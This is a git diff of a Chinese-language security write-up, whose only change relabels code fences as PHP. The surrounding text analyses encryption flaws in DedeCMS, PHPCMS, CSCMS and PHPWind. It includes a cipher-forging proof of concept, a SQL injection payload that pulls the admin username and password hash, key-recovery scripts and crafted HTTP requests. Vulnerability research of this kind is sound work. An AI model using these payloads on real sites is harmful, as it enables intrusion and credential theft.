@@ -52,7 +52,7 @@ rt................好紧张。。
 
 提取关键加解密函数代码
 
-```
+```php
 function enCrypt($txt)
 
     {
@@ -200,7 +200,7 @@ function enCrypt($txt)
 
 直接来看看 解密函数吧。
 
-```
+```php
 function deCrypt($txt)
 
     {
@@ -254,7 +254,7 @@ function deCrypt($txt)
 
 首先带入 setKey 函数，
 
-```
+```php
 A^K1 ->M1 
 
 B^K2 ->M2 
@@ -266,7 +266,7 @@ D^K4 ->M4
 
 然后将 M1~6 带入 decrypt 后的操作。
 
-```
+```php
 M2^M1 ->a 
 
 M4^M3 ->b 
@@ -278,7 +278,7 @@ abc 即为 我们的明文
 
 对于异或算法 我们知道 它有以下特性
 
-```
+```php
 H^I = J  ->  H^J=I
 
 (H^I)^J=H^I^J 
@@ -286,7 +286,7 @@ H^I = J  ->  H^J=I
 
 密文 A B 与明文 a 所对应的的关系为。
 
-```
+```php
 A^K1 = M1  M1^M2 = a   B^K2 = M2 
 ```
 
@@ -300,7 +300,7 @@ so，我们只需要一个已知明文的密文就可以 构造任意密文了�
 
 poc 如下，
 
-```
+```php
 function dede_cracked($Expressly,$Ciphertext,$str,$way){
 
 $Ciphertext = base64_decode($Ciphertext);
@@ -362,7 +362,7 @@ echo base64_encode($xxoo);}
 
 在 plus/carbuyaction.php
 
-```
+```php
 foreach($Items as $key=>$val)
 
                 {
@@ -384,7 +384,7 @@ foreach($Items as $key=>$val)
 
 我们可以用双引号来包裹 ' 再用逗号分隔 两个相连的 ''。
 
-```
+```php
 看到函数里的这段代码你就知道为什么我要这么做了。。直接看我的下面的 sql 语句可能会更形象~
 
 if (strpos($clean, '@') !== FALSE  OR strpos($clean,'char(')!== FALSE 
@@ -402,7 +402,7 @@ Shop_De 开头的和 DedeUserID 就是我们所需要的~
 
 得到 最终 playload
 
-```
+```php
 dede_cracked("id=108&price=11&units=&buynum=1&title=aa","AWgGMlFrAzNUMAFqWyYBdFV0UmgHNFI3Vm0BMwUwBC4AdQc5CmRVIAcgBWtfNVBzATBVcwApAW8FdlE%2FWWBVaAEnBiJRPwN2VGwBN1s9AWVVZw==","id=',\"'&title=\" or ',','8',(SELECT concat(uname,0x23,pwd) FROM dede_admin LIMIT 1),',','1')#","encrypt"); 
 ```
 
@@ -410,7 +410,7 @@ dede_cracked("id=108&price=11&units=&buynum=1&title=aa","AWgGMlFrAzNUMAFqWyYBdFV
 
 可以看到 mysql 的执行日志
 
-```
+```php
 INSERT INTO `dede_shops_products` (`aid`,`oid`,`userid`,`title`,`price`,`buynum`)
 
                     VALUES ('',"'','wooyuni','8','" or ',','8',(SELECT concat(uname,0x23,pwd) FROM dede_admin LIMIT 1),',','1')#','0.00','0') 
@@ -440,7 +440,7 @@ INSERT INTO `dede_shops_products` (`aid`,`oid`,`userid`,`title`,`price`,`buynum`
 
 phpcms/libs/functions/global.func.php 行 335
 
-```
+```php
 function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
 
     $key_length = 4;
@@ -500,7 +500,7 @@ function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
 
 /phpcms/modules/memeber/index.php 行 176
 
-```
+```php
 if($member_setting['enablemailcheck']) {
 
     pc_base::load_sys_func('mail');
@@ -514,13 +514,13 @@ if($member_setting['enablemailcheck']) {
 
 在注册过程中 如果后台配置了需要邮件认证，那么就会进入这个 if 生成一串校验值发往注册的邮箱。
 
-```
+```php
 $phpcms_auth_key = md5(pc_base::load_config('system', 'auth_key')); 
 ```
 
 这个 auth_key 其实就是核心加密 key，这里居然把 md5 后的核心 key 作为参数的一部分写入激活链接发到用户邮箱了。如果能够解开激活链接中的这个 code 值，我们就可以得到加密 key 从而任意生成加密串了。参数$code 生成方式为
 
-```
+```php
 sys_auth($userid.'|'.$phpcms_auth_key, 'ENCODE', $phpcms_auth_key); 
 ```
 
@@ -540,7 +540,7 @@ code 值为 d104CAgCBwZUAVYFVVIBAAVVVwldAAYEXQoNUQAKSFECWgAIAApUUlZUUQJTUlZRAA9U
 
 /phpcms/modules/content/down.php 行 76
 
-```
+```php
 if(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($f, '://') === FALSE) {
 
     $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT']);
@@ -560,13 +560,13 @@ if(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($
 
 $pc_auth_key 正好就是我们需要的
 
-```
+```php
 md5(pc_base::load_config('system','auth_key').""); 
 ```
 
 加密的字符串为
 
-```
+```php
 "i=$i&d=$d&s=$s&t=".SYS_TIME."&ip=".ip()."&m=".$m."&f=$f&modelid=".$modelid 
 ```
 
@@ -582,7 +582,7 @@ $i 就是下载的 id 从页面可以获得$d 是 downloadtype 一般是 1 $s �
 
 先来写一个小脚本来碰撞 IV
 
-```
+```php
 <?php
 
 $url = "http://**.**.**.**/index.php?m=content&c=down&a_k=f7c8BFEHCVEIBVYGVQJYB1ADXFNSAAxRAgcHDw5eDlMCR0oJR1oEUB5TW14RFREMHB9cWhRdWQ4CBRxHUEdQC0BPWlpOQQBOARtTGRUJEVVeQ2dDWh0AT1U%2BZ2N%2BDx0cWhEfUFwHHwxXUQNaDAVcBRVTWUEKVwhQWg";
@@ -652,13 +652,13 @@ code 来自上一步的收集
 
 如图跑完后得到的数据为
 
-```
+```php
 ddefc0e197b7374b3>ge27f56ab70db0deefc0e1970cc61f?74a27ffb3b70db0ddefc0e1970cc62c574a27ffb3b70db0ddefc0e1970cc62c574a27ffb3b70db0dde 
 ```
 
 按 32 位长度分段得到
 
-```
+```php
 ddefc0e197b7374b3>ge27f56ab70db0
 
 deefc0e1970cc61f?74a27ffb3b70db0
@@ -696,7 +696,7 @@ md5(pc_base::load_config('system','auth_key'))了
 
 /api/add_favorite.php 行 26
 
-```
+```php
 $phpcms_auth = param::get_cookie('auth');
 
 if($phpcms_auth) {
@@ -764,7 +764,7 @@ cookie 加密后的字符泄漏。可以替换其他字段，导致 SQL 等，�
 
 文件：C:\WWW\cscms_v3.5_utf8\app\controllers\open.php
 
-```
+```php
 //第三方登入入口
 
     public function login()
@@ -790,7 +790,7 @@ cookie 加密后的字符泄漏。可以替换其他字段，导致 SQL 等，�
 
 我们提交如下，看一下，程序加密后的字符。
 
-```
+```php
 GET /cscms_v3.5_utf8/index.php/open/login/qq HTTP/1.1
 
 Host: **.**.**.**
@@ -820,7 +820,7 @@ Referer: xxoo'
 
 替换其他地方就构成注入。
 
-```
+```php
 GET /cscms_v3.5_utf8/index.php/user/ulog/index/user HTTP/1.1
 
 Host: **.**.**.**
@@ -872,7 +872,7 @@ Cookie: cs_id=L8kxDzdqKNy9%2F2Qs0g
 
 存在于在线充值功能，直接上代码分析，建议先看漏洞证明：
 
-```
+```php
 /phpcms/phpcms/modules/pay/deposit.php 96 行起的 pay_recharge 方法
 
 ...
@@ -958,7 +958,7 @@ $trade_sn    = param::get_cookie('trade_sn'); //约 110 行位置，如果可以
 
 好了，关键是控制$trade_sn 的值，看 param::get_cookie 和 param::set_cookie 方法
 
-```
+```php
 /phpcms/phpcms/libs/classes/param.class.php
 
     public static function set_cookie($var, $value = '', $time = 0) {
@@ -1002,7 +1002,7 @@ $trade_sn    = param::get_cookie('trade_sn'); //约 110 行位置，如果可以
 
 看来想自己更改 cookie 值很难，不知道加密的 auth_key 值嘛，可是...如果利用一个能 set_cookie($value)的点，并且咱们能控制$value 呐？这个点自然是有的～
 
-```
+```php
 /phpcms/phpcms/modules/attachment/attachments.php 228 行起
 
     public function swfupload_json() {
@@ -1068,7 +1068,7 @@ $trade_sn    = param::get_cookie('trade_sn'); //约 110 行位置，如果可以
 
 在 src/applications/windidserver/api/controller/AppController.php 内代码：
 
-```
+```php
 public function listAction() {
 
         $result = $this->_getAppDs()->getList();
@@ -1086,7 +1086,7 @@ public function listAction() {
 
 内的代码：
 
-```
+```php
 $key = WindidUtility::appKey($appId, $time, $appKey, array('uid'=>$uid, 'type'=>'flash'), array('uid'=>'undefined'));
 
 …… 
@@ -1130,7 +1130,7 @@ POST：uid=undefined
 
 在官网测试了一下，拿到 key 后测试一下读取一个用户的资料：
 
-```
+```php
 <?php
 
 $secretkey = '308c6c43a*****279dd61dd80e8d59bd';
@@ -1230,7 +1230,7 @@ function appKey($apiId, $time, $secretkey, $get, $post) {
 
 phpcms/phpsso_server/phpcms/modules/phpsso/index.php 里有一段很可怕的代码
 
-```
+```php
 /**
 
      * 获取应用列表
@@ -1248,7 +1248,7 @@ phpcms/phpsso_server/phpcms/modules/phpsso/index.php 里有一段很可怕的代
 
 cache 里是什么内容呢，我们自己去看一下文件：
 
-```
+```php
 <?php
 
 return array (
@@ -1286,7 +1286,7 @@ return array (
 
 查看通行证代码发现，只要$_POST['data']可以解出来，就可以走下去。
 
-```
+```php
 if(isset($_GET) && is_array($_GET) && count($_GET) > 0) {
 
             foreach($_GET as $k=>$v) {
@@ -1304,7 +1304,7 @@ if(isset($_GET) && is_array($_GET) && count($_GET) > 0) {
 
 GET 全付给 POST
 
-```
+```php
 if(isset($_POST['data'])) {
 
             parse_str(sys_auth($_POST['data'], 'DECODE', $this->applist[$this->appid]['authkey']), $this->data);
@@ -1354,7 +1354,7 @@ s:7:"authkey";s:32:"L7UXO1cpUV6QmkX0oeGAXiOdQy6Hmvkr"
 
 拿到这个 key 已经可以想做什么想什么了，sso 体系里的东西都可以做了。
 
-```
+```php
 解密出来的东西不受控制，可以包含 null 截断，也可以包含单双引号 
 ```
 
